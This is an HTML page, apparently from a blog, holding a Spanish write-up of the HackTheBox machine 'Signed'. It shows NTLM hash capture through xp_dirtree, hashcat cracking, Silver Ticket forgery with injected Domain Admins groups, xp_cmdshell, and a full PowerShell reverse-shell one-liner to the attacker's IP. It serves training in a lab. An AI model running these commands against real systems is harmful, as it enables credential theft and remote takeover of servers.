@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Signed | ZsZsec</title>
+<meta content="MSSQL, forced NTLM authentication, cracking NTLMv2, Silver Ticket y abuso de xp_cmdshell para ejecución en el servidor." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">HackTheBox</p>
+<h1>Signed<span>_</span></h1>
+<div class="writeup-meta"><span>HackTheBox / MSSQL / NTLMv2</span></div>
+<div class="tag-row"><span class="tag">HackTheBox</span><span class="tag">MSSQL</span><span class="tag">NTLMv2</span><span class="tag">Silver Ticket</span><span class="tag">Kerberos</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body"><h3>Escaneo de Puertos</h3>
+<p>Iniciamos la fase de reconocimiento realizando un escaneo de puertos completo sobre el objetivo utilizando <code>nmap</code>:</p>
+<pre><code class="language-bash">Nmap 7.95 scan initiated Sun Jan 11 15:10:53 2026 as: /usr/lib/nmap/nmap --privileged -p- -Pn --min-rate 4500 -oN basico 10.10.11.90
+Nmap scan report for 10.10.11.90
+Host is up (4.5s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+</code></pre>
+<p>El escaneo revela únicamente el puerto <strong>1433/TCP</strong> abierto, correspondiente al servicio <strong>Microsoft SQL Server</strong>.</p>
+<h3>Enumeración de Servicios</h3>
+<p>Procedemos a realizar un escaneo más exhaustivo sobre el puerto identificado para determinar la versión del servicio y ejecutar scripts de reconocimiento básicos:</p>
+<pre><code class="language-bash">Nmap 7.95 scan initiated Sun Jan 11 15:12:42 2026 as: /usr/lib/nmap/nmap --privileged -sV -sC -p1433 -Pn --min-rate 45000 -oN exhaustivo 10.10.11.90
+Nmap scan report for 10.10.11.90
+Host is up (0.12s latency).
+
+PORT     STATE SERVICE  VERSION
+1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
+|_ssl-date: 2026-01-11T08:13:43+00:00; -6h59m34s from scanner time.
+| ms-sql-info: 
+|   10.10.11.90:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2022 RTM
+|       number: 16.00.1000.00
+|       Product: Microsoft SQL Server 2022
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-01-09T10:03:37
+|_Not valid after:  2056-01-09T10:03:37
+| ms-sql-ntlm-info: 
+|   10.10.11.90:1433: 
+|     Target_Name: SIGNED
+|     NetBIOS_Domain_Name: SIGNED
+|     NetBIOS_Computer_Name: DC01
+|     DNS_Domain_Name: SIGNED.HTB
+|     DNS_Computer_Name: DC01.SIGNED.HTB
+|     DNS_Tree_Name: SIGNED.HTB
+|_    Product_Version: 10.0.17763
+
+Host script results:
+|_clock-skew: mean: -6h59m34s, deviation: 0s, median: -6h59m34s
+</code></pre>
+<p><strong>Información clave obtenida:</strong></p>
+<ul>
+<li><strong>Servicio:</strong> Microsoft SQL Server 2022 (versión 16.00.1000.00 RTM)</li>
+<li><strong>Dominio:</strong> SIGNED.HTB</li>
+<li><strong>Controlador de dominio:</strong> DC01.SIGNED.HTB</li>
+<li><strong>Desfase horario:</strong> -6h59m34s</li>
+</ul>
+<p>Agregamos el dominio a nuestro archivo <code>/etc/hosts</code>:</p>
+<pre><code class="language-bash">echo "10.10.11.90 SIGNED.HTB DC01.SIGNED.HTB" | sudo tee -a /etc/hosts
+</code></pre>
+<h2>Acceso Inicial</h2>
+<p>Con las credenciales proporcionadas por la plataforma, establecemos conexión al servidor MSSQL utilizando <code>impacket-mssqlclient</code>:</p>
+<pre><code class="language-bash">impacket-mssqlclient "signed.htb/scott@10.10.11.90"
+</code></pre>
+<h2>Enumeración Interna del MSSQL</h2>
+<p>Tras realizar una enumeración exhaustiva de la instancia MSSQL (bases de datos, tablas, procedimientos almacenados, configuraciones), no se identificaron vectores de ataque evidentes o información sensible directamente explotable.</p>
+<h1>Forced NTLM Authentication via MSSQL using xp_dirtree</h1>
+<p>Dado que el servidor MSSQL puede realizar conexiones salientes y autenticarse contra recursos de red, decidimos intentar un ataque de <strong>relay/captura de hash NTLM</strong> forzando al servidor a autenticarse contra un servidor SMB malicioso bajo nuestro control.</p>
+<h3>Configuración del Listener</h3>
+<p>Configuramos <code>Responder</code> para interceptar las credenciales NTLM:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/b3edbf12-12a4-442d-bfe1-591538224fe3"/></p>
+<h3>Forzando la Autenticación</h3>
+<p>Desde la sesión de MSSQL, ejecutamos una consulta que obliga al servidor a intentar acceder a un recurso compartido SMB en nuestra máquina atacante:</p>
+<pre><code class="language-bash">EXEC xp_dirtree '\\10.10.17.173\share';
+</code></pre>
+<p>En el listener del <code>responder</code> logramos capturar lo siguiente</p>
+<pre><code class="language-bash">[SMB] NTLMv2-SSP Client   : 10.10.11.90
+[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
+[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:b2a5aa3db614159f:2E7FD8B6EAEEB3671C54911CD274FC91:0101000000000000802DDABE8983DC0139C7A4E784355DA10000000002000800360045003300430001001E00570049004E002D004200550054003200320036005200590030005300330004003400570049004E002D00420055005400320032003600520059003000530033002E0036004500330043002E004C004F00430041004C000300140036004500330043002E004C004F00430041004C000500140036004500330043002E004C004F00430041004C0007000800802DDABE8983DC01060004000200000008003000300000000000000000000000003000007D748780041DFBDD5D69143D9A8F7188D2352FD85CCC9271A1A0DAA4235E41EF0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310037002E003100370033000000000000000000 
+</code></pre>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/69dcc534-4cbf-4b1d-917a-ccdf1e3ac0b0"/></p>
+<p>Ahora utilizaremos la herramienta <code>hashcat</code> para intentar crackear el <code>hash</code></p>
+<h1>Cracking Hash NTLMv2</h1>
+<p>Utilizaremos la herramienta <code>hashcat</code></p>
+<pre><code class="language-bash">hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
+
+MSSQLSVC::SIGNED:b2a5aa3db614159f:2e7fd8b6eaeeb3671c54911cd274fc91:0101000000000000802ddabe8983dc0139c7a4e784355da10000000002000800360045003300430001001e00570049004e002d004200550054003200320036005200590030005300330004003400570049004e002d00420055005400320032003600520059003000530033002e0036004500330043002e004c004f00430041004c000300140036004500330043002e004c004f00430041004c000500140036004500330043002e004c004f00430041004c0007000800802ddabe8983dc01060004000200000008003000300000000000000000000000003000007d748780041dfbdd5d69143d9a8f7188d2352fd85ccc9271a1a0daa4235e41ef0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310037002e003100370033000000000000000000:purPLE9795!@
+</code></pre>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/30184ad8-de61-4996-ba23-4a0a98955565"/></p>
+<p>Contrasena</p>
+<pre><code>purPLE9795!@</code></pre>
+<p>Ahora tenemos la contrasena de <code>mssqlsvc</code></p>
+<h2>Autenticación como mssqlsvc</h2>
+<h3>Acceso con Credenciales Recuperadas</h3>
+<p>Una vez obtenido y crackeado el hash NTLM capturado previamente, procedemos a autenticarnos en el servidor MSSQL utilizando la cuenta de servicio <code>mssqlsvc</code>:</p>
+<pre><code class="language-bash">impacket-mssqlclient mssqlsvc:'purPLE9795!@'@10.10.11.90 -windows-auth
+</code></pre>
+<p><strong>Credenciales utilizadas:</strong></p>
+<ul>
+<li><strong>Usuario:</strong> mssqlsvc</li>
+<li><strong>Contraseña:</strong> purPLE9795!@</li>
+<li><strong>Método de autenticación:</strong> Windows Authentication</li>
+</ul>
+<h3>Enumeración Post-Autenticación</h3>
+<p>Tras establecer la conexión exitosa como <code>mssqlsvc</code>, realizamos una enumeración de los permisos y privilegios disponibles:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/9418ec83-ef10-4311-ac94-3f57ae126258"/></p>
+<p><strong>Hallazgos clave:</strong></p>
+<ul>
+<li><strong>Contexto de ejecución:</strong> La sesión se ejecuta bajo el usuario <code>SIGNED\mssqlsvc</code> con el rol de <code>guest</code> en la base de datos <code>master</code>, lo que indica permisos muy limitados.</li>
+<li><strong>Miembros del rol sysadmin identificados:</strong><ul>
+<li><code>sa</code> - Cuenta de administrador predeterminada de SQL Server</li>
+<li><strong><code>SIGNED\IT</code></strong> - Grupo o usuario del dominio con privilegios administrativos completos en MSSQL</li>
+<li>Varias cuentas de servicio NT (SQLWriter, Winmgmt, MSSQLSERVER, SQLSERVERAGENT)</li>
+</ul>
+</li>
+</ul>
+<p><strong>Análisis de permisos:</strong></p>
+<p>La cuenta <code>mssqlsvc</code> <strong>NO</strong> es miembro del rol <code>sysadmin</code>, lo que significa que:</p>
+<ul>
+<li>No puede ejecutar <code>xp_cmdshell</code> para ejecución de comandos del sistema</li>
+<li>No tiene permisos para habilitar características avanzadas</li>
+<li>Acceso limitado a bases de datos y procedimientos almacenados</li>
+<li>No puede modificar configuraciones críticas del servidor</li>
+</ul>
+<p>Sin embargo, identificamos un vector de ataque prometedor: el grupo/usuario <strong><code>SIGNED\IT</code></strong> posee privilegios <code>sysadmin</code> completos en la instancia MSSQL.</p>
+<h3>Vector de Ataque Identificado</h3>
+<p>Dado el contexto de un entorno de Active Directory y las credenciales de una <strong>cuenta de servicio</strong> en nuestro poder, evaluamos la viabilidad de realizar un ataque de falsificación de tickets Kerberos para impersonar a un miembro del grupo <strong>IT</strong> o directamente al usuario <strong>Administrator</strong>, lo que nos otorgaría privilegios completos sobre el servidor MSSQL</p>
+<h2>Silver Ticket Attack</h2>
+<h3>Contexto del Ataque</h3>
+<p>Un <strong>Silver Ticket</strong> es un ticket TGS (Ticket Granting Service) de Kerberos falsificado que permite a un atacante impersonar cualquier usuario ante un servicio específico sin necesidad de contactar al KDC (Key Distribution Center/Domain Controller).</p>
+<p>A diferencia de un Golden Ticket (que requiere el hash del KRBTGT), un Silver Ticket solo necesita el hash de la cuenta de servicio, lo que lo hace más sigiloso ya que:</p>
+<ul>
+<li>No genera eventos de autenticación en el Domain Controller</li>
+<li>Solo es válido para el servicio específico comprometido</li>
+<li>Es más difícil de detectar por las soluciones de monitoreo tradicionales</li>
+</ul>
+<h3>Requisitos para el Ataque</h3>
+<p>Para generar un Silver Ticket válido, necesitamos recopilar los siguientes elementos:</p>
+<ol>
+<li><strong>Hash NTLM de la cuenta de servicio:</strong> Credenciales de <code>mssqlsvc</code> (ya obtenidas)</li>
+<li><strong>SID del dominio:</strong> Identificador único del dominio SIGNED.HTB</li>
+<li><strong>SPN (Service Principal Name):</strong> Nombre del servicio al que queremos acceder</li>
+<li><strong>Usuario a impersonar:</strong> Típicamente una cuenta con privilegios elevados (ej: Administrator)</li>
+<li><strong>RID del usuario objetivo:</strong> Identificador relativo del usuario a impersonar</li>
+</ol>
+<h1>## Recopilación de Requisitos para el Silver Ticket</h1>
+<h3>1. Conversión de Contraseña a Hash NTLM</h3>
+<p>El primer requisito es obtener el hash NTLM de la cuenta de servicio <code>mssqlsvc</code>. Dado que ya disponemos de la contraseña en texto claro (<code>purPLE9795!@</code>), procedemos a convertirla a su representación hash NTLM:</p>
+<pre><code class="language-bash">echo -n 'purPLE9795!@' | iconv -f UTF-8 -t UTF-16LE | openssl md4
+MD4(stdin)= ef699384c3285c54128a3ee1ddb1a0cc
+</code></pre>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/cac0c544-0978-4520-bce0-5ecece6fd8f6"/></p>
+<h2>2. Extracción del SID del Dominio y RID del Objetivo</h2>
+<p>Para obtener el SID del dominio y el RID (Relative Identifier) del grupo/usuario al que queremos impersonar, analizamos la información previamente recopilada del comando <code>EXEC sp_helpsrvrolemember</code>. Identificamos que el grupo <strong><code>SIGNED\IT</code></strong> posee privilegios <code>sysadmin</code> en MSSQL, con el siguiente SID en formato binario:</p>
+<pre><code class="language-bash">SQL (SIGNED\mssqlsvc  guest@master)&gt; EXEC sp_helpsrvrolemember;
+ServerRole   MemberName                                                                            MemberSID   
+----------   -------------------------   -------------------------------------------------------------------   
+sysadmin     sa                                                                                        b'01'   
+sysadmin     SIGNED\IT                           b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'   
+sysadmin     NT SERVICE\SQLWriter        b'010600000000000550000000732b9753646ef90356745cb675c3aa6cd6b4d28b'   
+sysadmin     NT SERVICE\Winmgmt          b'0106000000000005500000005a048ddff9c7430ab450d4e7477a2172ab4170f4'   
+sysadmin     NT SERVICE\MSSQLSERVER      b'010600000000000550000000e20f4fe7b15874e48e19026478c2dc9ac307b83e'   
+sysadmin     NT SERVICE\SQLSERVERAGENT   b'010600000000000550000000dca88f14b79fd47a992a3d8943f829a726066357'
+</code></pre>
+<h4>Conversión del SID Binario</h4>
+<p>Los SIDs en formato binario de Windows deben ser convertidos a su representación legible. Utilizamos un script Python para realizar esta conversión:</p>
+<pre><code class="language-bash">└─$ python3 RID.py                            
+Domain SID: S-1-5-21-4088429403-1159899800-2753317549
+RID: 1105
+SID completo: S-1-5-21-4088429403-1159899800-2753317549-1105
+</code></pre>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/8244cd69-3ca1-48f6-822b-32a0e711d9d8"/></p>
+<p><strong>Información Extraída</strong></p>
+<table>
+<thead>
+<tr>
+<th>Componente</th>
+<th>Valor</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Domain SID</strong></td>
+<td><code>S-1-5-21-4088429403-1159899800-2753317549</code></td>
+</tr>
+<tr>
+<td><strong>RID del grupo IT</strong></td>
+<td><code>1105</code></td>
+</tr>
+<tr>
+<td><strong>SID completo IT</strong></td>
+<td><code>S-1-5-21-4088429403-1159899800-2753317549-1105</code></td>
+</tr>
+</tbody>
+</table>
+<h3>Estructura del SID explicada</h3>
+<ul>
+<li><strong>S-1</strong>: Versión del SID</li>
+<li><strong>5</strong>: Autoridad de seguridad (<em>NT Authority</em>)</li>
+<li><strong>21</strong>: Indica que pertenece a un dominio</li>
+<li><strong>4088429403-1159899800-2753317549</strong>: Identificador único del dominio <code>SIGNED.HTB</code></li>
+<li><strong>1105</strong>: RID correspondiente al grupo/usuario <strong>IT</strong></li>
+</ul>
+<h3>3. Identificación del SPN (Service Principal Name)</h3>
+<p>Para el servicio <strong>MSSQL</strong> en el <strong>Domain Controller</strong>, el SPN sigue el formato estándar:</p>
+<pre><code class="language-bash">MSSQLSvc/SIGNED.HTB
+</code></pre>
+<h3>4. Estrategia de Impersonación</h3>
+<p>Para el Silver Ticket, utilizaremos una técnica que combina la impersonación del usuario <code>Administrator</code> (RID 500) con la <strong>inyección de membresías de grupo</strong> en el ticket PAC (Privilege Attribute Certificate).</p>
+<p>Específicamente, incluiremos al usuario en los siguientes grupos:</p>
+<ul>
+<li><strong>RID 512:</strong> Domain Admins</li>
+<li><strong>RID 1105:</strong> IT (grupo con privilegios sysadmin en MSSQL)</li>
+</ul>
+<p>Esta técnica es más efectiva que simplemente impersonar al grupo IT, ya que:</p>
+<ul>
+<li>El ticket se emite para el usuario <code>mssqlsvc</code> (manteniendo consistencia)</li>
+<li>El PAC incluye membresías a grupos privilegiados</li>
+<li>MSSQL reconocerá la pertenencia al grupo IT y otorgará privilegios sysadmin</li>
+</ul>
+<h2>Generación del Silver Ticket</h2>
+<p>Con todos los requisitos recopilados, procedemos a forjar el Silver Ticket utilizando <code>impacket-ticketer</code>:</p>
+<pre><code class="language-bash">impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid "S-1-5-21-4088429403-1159899800-2753317549"  -domain SIGNED.HTB -spn MSSQLSvc/DC01.SIGNED.HTB -groups 512,1105 -user-id 500 mssqlsvc
+</code></pre>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/695e548d-96f8-48e8-b3b0-5aea2b2c9877"/></p>
+<h3>Parámetros utilizados y su explicación</h3>
+<ul>
+<li><strong><code>-nthash</code></strong>: Hash NTLM de la cuenta de servicio <code>mssqlsvc</code>, utilizado para firmar el ticket Kerberos generado.</li>
+<li><strong><code>-domain-sid</code></strong>: SID base del dominio <code>SIGNED.HTB</code>, excluyendo el RID final del usuario o grupo.</li>
+<li><strong><code>-domain</code></strong>: Nombre completo del dominio objetivo (<code>SIGNED.HTB</code>).</li>
+<li><strong><code>-spn</code></strong>: <em>Service Principal Name</em> del servicio MSSQL contra el cual se generará el ticket Kerberos.</li>
+<li><strong><code>-groups</code></strong>: RIDs de los grupos que se incluirán en el PAC del ticket.<ul>
+<li><code>512</code> → <strong>Domain Admins</strong></li>
+<li><code>1105</code> → <strong>Grupo IT</strong></li>
+</ul>
+</li>
+<li><strong><code>-user-id</code></strong>: RID del usuario que será representado dentro del ticket Kerberos.<ul>
+<li><code>500</code> → <strong>Administrador del dominio</strong></li>
+</ul>
+</li>
+<li><strong><code>mssqlsvc</code></strong>: Nombre del usuario de servicio para el cual se genera el ticket Kerberos.</li>
+</ul>
+<p>El ticket se guarda exitosamente en el archivo <code>mssqlsvc.ccache</code>.</p>
+<h2>Configuración y Validación del Ticket</h2>
+<h3>Exportar el Ticket al Cache de Kerberos</h3>
+<p>Configuramos la variable de entorno <code>KRB5CCNAME</code> para que las herramientas de Kerberos utilicen nuestro ticket falsificado:</p>
+<pre><code class="language-bash">export KRB5CCNAME="$(pwd)/mssqlsvc.ccache"
+</code></pre>
+<h3>Verificar el Ticket Generado</h3>
+<p>Listamos los tickets disponibles en el cache:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/226d4360-96fc-420b-a681-c43fcc2a7f64"/></p>
+<p><strong>Análisis del ticket:</strong></p>
+<ul>
+<li><strong>Principal:</strong> <a href="mailto:mssqlsvc@SIGNED.HTB">mssqlsvc@SIGNED.HTB</a> (usuario para quien se emitió el ticket)</li>
+<li><strong>Servicio:</strong> MSSQLSvc/DC01.<a href="mailto:SIGNED.HTB@SIGNED.HTB">SIGNED.HTB@SIGNED.HTB</a> (servicio MSSQL objetivo)</li>
+<li><strong>Validez:</strong> 10 años (desde 01/12/2026 hasta 01/10/2036)</li>
+<li><strong>Estado:</strong> Activo y listo para usar</li>
+</ul>
+<blockquote>
+<p><strong>Nota importante:</strong> El ticket tiene una validez extendida de 10 años, lo cual es anormal y podría ser detectado por soluciones de monitoreo avanzadas. En entornos reales, los tickets Kerberos típicamente tienen una validez de 10 horas.</p>
+</blockquote>
+<h2>Autenticación con el Silver Ticket</h2>
+<p>Ahora podemos autenticarnos en el servicio MSSQL utilizando el ticket falsificado, sin necesidad de proporcionar credenciales:</p>
+<pre><code class="language-bash">┌──(zikuta㉿zikuta)-[~/Desktop/htb/Signed]
+└─$ impacket-mssqlclient -k -no-pass -windows-auth  'SIGNED.HTB/mssqlsvc@DC01.SIGNED.HTB'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01): Line 1: Changed database context to 'master'.
+[*] INFO(DC01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
+[!] Press help for extra shell commands
+SQL (SIGNED\Administrator  dbo@master)&gt;
+</code></pre>
+<p><strong>Observación importante:</strong> Aunque nos autenticamos con el usuario <code>mssqlsvc</code>, el prompt indica <code>SIGNED\Administrator</code> debido a la configuración del ticket con <code>-user-id 500</code>, que corresponde al RID del usuario Administrator.</p>
+<p>Verificamos si tenemos permisos de sysadmin</p>
+<pre><code class="language-bash">SQL (SIGNED\Administrator  dbo@master)&gt; SELECT IS_SRVROLEMEMBER('sysadmin');
+    
+-   
+1
+</code></pre>
+<p>El valor <code>1</code> confirma que poseemos el rol <strong>sysadmin</strong>, lo que nos otorga control total sobre la instancia MSSQL.</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/36a06da4-1035-435d-afcc-b6ce032eebaa"/></p>
+<h2>Habilitación de xp_cmdshell y Ejecución de Comandos</h2>
+<p>Con privilegios administrativos completos, procedemos a habilitar el procedimiento almacenado <code>xp_cmdshell</code>, que permite ejecutar comandos del sistema operativo desde MSSQL:</p>
+<pre><code class="language-bash">QL (SIGNED\Administrator  dbo@master)&gt; enable_xp_cmdshell
+INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+</code></pre>
+<h3>Obtención de Reverse Shell</h3>
+<p>Con <code>xp_cmdshell</code> habilitado, ejecutamos un one-liner de PowerShell para establecer una reverse shell hacia nuestra máquina atacante:</p>
+<pre><code class="language-bash">SQL (SIGNED\Administrator  dbo@master)&gt; EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.17.173'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''&gt; '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
+</code></pre>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/e07b555f-ffd9-4883-898a-c7163da75ac0"/></p>
+<p>En nuestra máquina atacante:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/bd40967e-8f56-4dde-a01c-6d31ec09592d"/></p>
+<h3>Acceso al Sistema Obtenido</h3>
+<p>Recibimos la conexión inversa y obtenemos acceso al sistema</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/54d0d80f-60a7-4a40-bc14-02076bd5544c"/></p>
+<p><strong>Flag de usuario obtenida:</strong> <code>user.txt</code></p>
+<h2>Limitaciones del Silver Ticket Inicial</h2>
+<h3>Identificación del Problema Real</h3>
+<p>Aunque logramos autenticarnos en MSSQL con privilegios <code>sysadmin</code> utilizando el Silver Ticket inicial, cuando intentamos acceder a recursos del sistema que requieren permisos elevados, nos encontramos con un error crítico.</p>
+<p><strong>El objetivo:</strong> Leer la flag de root ubicada en:</p>
+<pre><code>C:\Users\Administrator\Desktop\root.txt
+</code></pre>
+<p><strong>El problema:</strong> Al intentar acceder a este archivo desde MSSQL usando <code>OPENROWSET</code> con el ticket generado con <code>-user-id 500</code>:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/6f6a842d-35c0-4bf3-8bf0-d0b3fae59166"/></p>
+<h3>Análisis del Error 1346</h3>
+<p>El <strong>error 1346</strong> de Windows indica un problema con los <strong>niveles de suplantación (impersonation)</strong> en el contexto de seguridad de Kerberos. Este error ocurre específicamente cuando:</p>
+<ol>
+<li><strong>Delegación Kerberos insuficiente:</strong> El ticket no tiene los niveles de delegación necesarios para que MSSQL pueda suplantar al usuario al acceder a recursos del sistema de archivos</li>
+<li><strong>Problema con el PAC (Privilege Attribute Certificate):</strong> El PAC del ticket no se está validando correctamente, causando que Windows rechace las credenciales al intentar acceder a recursos protegidos</li>
+<li><strong>Discrepancia de identidad:</strong> El ticket fue generado con <code>-user-id 500</code> (Administrator), pero el servicio MSSQL se ejecuta bajo la cuenta <code>mssqlsvc</code> (RID 1103). Esta inconsistencia entre:<ul>
+<li>El SID en el ticket Kerberos (Administrator - RID 500)</li>
+<li>El SID real del proceso de SQL Server (mssqlsvc - RID 1103)Causa que Windows no pueda validar correctamente el contexto de seguridad y rechace la suplantación.</li>
+</ul>
+</li>
+</ol>
+<h3>Verificación del Usuario Real</h3>
+<p>Desde la reverse shell, confirmamos el SID real del usuario bajo el cual opera el servicio:</p>
+<pre><code class="language-bash">PS C:\Windows\system32&gt; whoami /all
+
+USER INFORMATION
+----------------
+
+User Name       SID                                           
+=============== ==============================================
+signed\mssqlsvc S-1-5-21-4088429403-1159899800-2753317549-1103
+</code></pre>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/114fb130-ce29-44c4-a44d-b5ef05b64830"/></p>
+<p><strong>RID de mssqlsvc:</strong> <code>1103</code></p>
+<h2>Generación del Silver Ticket Corregido</h2>
+<h3>Solución: Alineación de Identidad + Inyección de Grupos</h3>
+<p>Para resolver el error 1346 y permitir que MSSQL acceda a recursos protegidos del sistema, necesitamos un Silver Ticket que:</p>
+<ol>
+<li><strong>Use el RID correcto</strong> de <code>mssqlsvc</code> (1103) en lugar del RID de Administrator (500)</li>
+<li><strong>Inyecte las membresías de grupos privilegiados</strong> en el PAC (Domain Admins e IT)</li>
+<li><strong>Mantenga consistencia</strong> entre el SID del ticket y el SID del proceso</li>
+</ol>
+<p>Esto permite que:</p>
+<ul>
+<li>Windows valide correctamente el contexto de seguridad</li>
+<li>El PAC sea reconocido como legítimo</li>
+<li>Las membresías de grupo inyectadas sean efectivas</li>
+<li>La suplantación (impersonation) funcione correctamente</li>
+</ul>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/f2462a13-cf5b-45f4-b2ea-d866898a28fd"/></p>
+<p><strong>Cambio crítico:</strong></p>
+<ul>
+<li><strong>Antes:</strong> <code>-user-id 500</code> (Administrator) → Causaba error 1346</li>
+<li><strong>Ahora:</strong> <code>-user-id 1103</code> (mssqlsvc real) → Permite validación correcta del PAC</li>
+</ul>
+<p><strong>Parámetros explicados:</strong></p>
+<ul>
+<li><code>-user-id 1103</code>: RID <strong>real</strong> de mssqlsvc, alineado con el proceso del servicio</li>
+<li><code>-groups 512,1105</code>:<ul>
+<li><strong>512</strong> = Domain Admins (acceso total al sistema)</li>
+<li><strong>1105</strong> = IT (privilegios sysadmin en MSSQL)</li>
+</ul>
+</li>
+</ul>
+<h3>Cómo Funciona la Solución</h3>
+<p><strong>Flujo de autenticación corregido:</strong></p>
+<ol>
+<li>El ticket Kerberos presenta el SID <code>S-1-5-21-...-1103</code> (mssqlsvc)</li>
+<li>Windows valida que este SID coincide con el proceso de SQL Server</li>
+<li>Windows lee el PAC y reconoce las membresías de grupo:<ul>
+<li><code>mssqlsvc</code> es miembro de <strong>Domain Admins</strong> (grupo 512)</li>
+<li><code>mssqlsvc</code> es miembro de <strong>IT</strong> (grupo 1105)</li>
+</ul>
+</li>
+<li>Al intentar acceder a <code>C:\Users\Administrator\Desktop\root.txt</code>:<ul>
+<li>MSSQL suplanta al usuario <code>mssqlsvc</code></li>
+<li>Windows valida los permisos basándose en las membresías de grupo</li>
+<li>Como <code>mssqlsvc</code> "pertenece" a Domain Admins, tiene acceso total</li>
+</ul>
+</li>
+<li>El archivo se lee exitosamente</li>
+</ol>
+<p><strong>Nos autenticamos en MSSQL con el ticket corregido:</strong></p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/56235d84-4200-4c63-8f6b-db699649fd8e"/></p>
+<p>Ahora podemos leer archivos con altos privilegios en el sistema:</p>
+<pre><code class="language-bash">SQL (SIGNED\mssqlsvc  dbo@master)&gt; SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS t;
+BulkColumn                                
+---------------------------------------   
+b'[redacted]\r\n' 
+</code></pre>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/1c1d4872-41fc-4cd0-871f-2adfc6c791cf"/></p>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
